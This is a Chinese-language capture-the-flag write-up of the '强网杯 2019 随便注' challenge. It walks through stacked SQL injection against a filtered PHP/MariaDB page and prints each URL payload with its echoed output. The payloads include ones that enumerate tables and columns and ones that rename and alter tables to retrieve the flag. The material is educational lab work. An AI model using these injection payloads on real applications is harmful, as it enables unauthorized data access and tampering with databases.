# 刷题！！！>_<

## [强网杯 2019]随便注

sqlmap是没有灵魂的...来自作者的怨念，F12即读

注入0，无回显

注入1，返回：

array(2) {
  [0]=>
  string(1) "1"
  [1]=>
  string(7) "hahahah"
}

注入2,返回：

array(2) {
  [0]=>
  string(1) "2"
  [1]=>
  string(12) "miaomiaomiao"
}

注入1'，返回：

error 1064 : You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near ''1''' at line 1

说明用双引号包裹了$_GET()

注入1.1，返回：

return preg_match("/select|update|delete|drop|insert|where|\./i",$inject);

直接把过滤内容给我们了，很良心

select和update被ban掉，只能使用堆叠注入。

查看一下查询的内容有几个字段，可以用order by：

?injdect=1%27 order by n%23

n=2时正常回显，n=3时报错，说明查询字段数为2（其实看回显也看得出来

看表名：

?inject=1%27%3Bshow tables%3B

回显：

array(1) {
  [0]=>
  string(16) "1919810931114514"
}

array(1) {
  [0]=>
  string(5) "words"
}

可以看到有两张表，分别看一下字段：

?inject=1%27%3Bshow columns from words%23

回显：

array(6) {
  [0]=>
  string(2) "id"
  [1]=>
  string(7) "int(10)"
  [2]=>
  string(2) "NO"
  [3]=>
  string(0) ""
  [4]=>
  NULL
  [5]=>
  string(0) ""
}

array(6) {
  [0]=>
  string(4) "data"
  [1]=>
  string(11) "varchar(20)"
  [2]=>
  string(2) "NO"
  [3]=>
  string(0) ""
  [4]=>
  NULL
  [5]=>
  string(0) ""
}

有id和data两个字段，结合我们的初始回显可以猜测，题目的select就是从这里取值。

猜测select结构：

```sql
SELECT data FROM words where id=$_GET()
```

再看另一个表：

?inject=1%27%3Bshow columns from 1919810931114514%23

没回显？查了一下，纯数字表名直接select from会报错，所以需要加一个引用符号，在mysql中是反引号`

?inject=1%27%3Bshow columns from %601919810931114514%60%23

得到回显：

array(6) {
  [0]=>
  string(4) "flag"
  [1]=>
  string(12) "varchar(100)"
  [2]=>
  string(2) "NO"
  [3]=>
  string(0) ""
  [4]=>
  NULL
  [5]=>
  string(0) ""
}

flag就在这里，可是禁用了select，该怎么拿出来呢？

我们唯一可用的select应该是后台sql中原语句里的select，但是它从words中选数。

所以一种想法是：用rename和alter把后台的sql数据库架构修改一下！（毕竟题目环境给了我们很大的权限

```sql
RENAME TABLE 旧表名 TO 新表名;
ALTER TABLE table_name ADD COLUMN new_column datatype [AFTER old_column];
ALTER TABLE table_name CHANGE old_column new_column new_column_datatype;
```

?inject=1%27%3Brename table words to tmp%3Brename table %601919810931114514%60 to words%3Balter table words add column id int unsigned not NULL auto_increment primary key%3Balter table words change flag data varchar%28100%29%3B%23

首先把原来的words改成tmp，再把一串恶臭的数字改成words，在words中加入自动递增的序号id（因为原来的words应该也是这样生成id的），然后再把原来的flag字段改名成data字段，这样就可以供直接select出来了。

再输入1查询，即可得到flag：

array(2) {
  [0]=>
  string(42) "flag{264815d4-1b95-4c17-8768-010121b41e09}"
  [1]=>
  string(1) "1"
}



